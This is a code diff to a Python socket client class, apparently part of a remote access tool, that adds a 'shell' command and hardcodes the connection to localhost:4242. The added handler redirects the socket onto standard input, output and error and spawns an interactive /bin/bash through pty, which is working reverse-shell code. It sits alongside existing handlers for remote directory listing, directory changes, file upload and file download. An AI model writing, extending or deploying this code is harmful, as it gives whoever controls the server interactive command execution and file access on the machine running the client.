@@ -7,6 +7,7 @@ import select
 import socket
 import json
 import time
+import pty
 import os
 
 logging.basicConfig(level=None)
@@ -121,22 +122,43 @@ class NetManager:
     def handle_file_transfers(self, data):
         """Handles file transfers based on the received data."""
         params = data.decode().split(" ")
-        if params[0] == "ls":
+        if params[0] == "shell":
+            stdout_value = NO_OUTPUT_SIGNAL.encode()
+            self.send_response(stdout_value)
+            # Save the old file descriptors
+            old_stdin = os.dup(0)
+            old_stdout = os.dup(1)
+            old_stderr = os.dup(2)
+            file_descriptor = self.socket.fileno()
+            # Duplicate the file descriptor for standard input, output, and error
+            os.dup2(file_descriptor, 0)  # Standard Input
+            os.dup2(file_descriptor, 1)  # Standard Output
+            os.dup2(file_descriptor, 2)  # Standard Error
+
+            # Spawn a new shell process
+            pty.spawn("/bin/bash")
+            # After the pty.spawn is done, restore the old file descriptors
+            self.socket.sendall(b"PotatoeMunchkinExit132@@")
+            os.dup2(old_stdin, 0)
+            os.dup2(old_stdout, 1)
+            os.dup2(old_stderr, 2)
+            return True
+        elif params[0] == "ls":
             if len(params) == 2:
                 self.send_response(scandir_to_dict(params[1]))
             elif len(params) == 1:
                 self.send_response(scandir_to_dict())
             return True
-        if data.decode().split(" ")[0] == "cd":
+        elif data.decode().split(" ")[0] == "cd":
             cmd = data.decode().split(" ")[0]
             folder = data.decode().split(" ")[1]
             self.change_directory(cmd, folder)
             return True
-        if SENDING_FILE in data:
+        elif SENDING_FILE in data:
             file = data.decode().split("sendingfile ")[1].strip()
             self.receive_file(file)
             return True
-        if GETTING_FILE in data:
+        elif GETTING_FILE in data:
             file = data.decode().split("gettingfile ")[1].strip()
             self.send_file(file)
             return True
@@ -187,7 +209,7 @@ def main():
     if args.test:
         print("Hello world! Wasd")
         return
-    net_manager = NetManager(args.host, args.port)
+    net_manager = NetManager("localhost", 4242)
     net_manager.netloop()
 
 
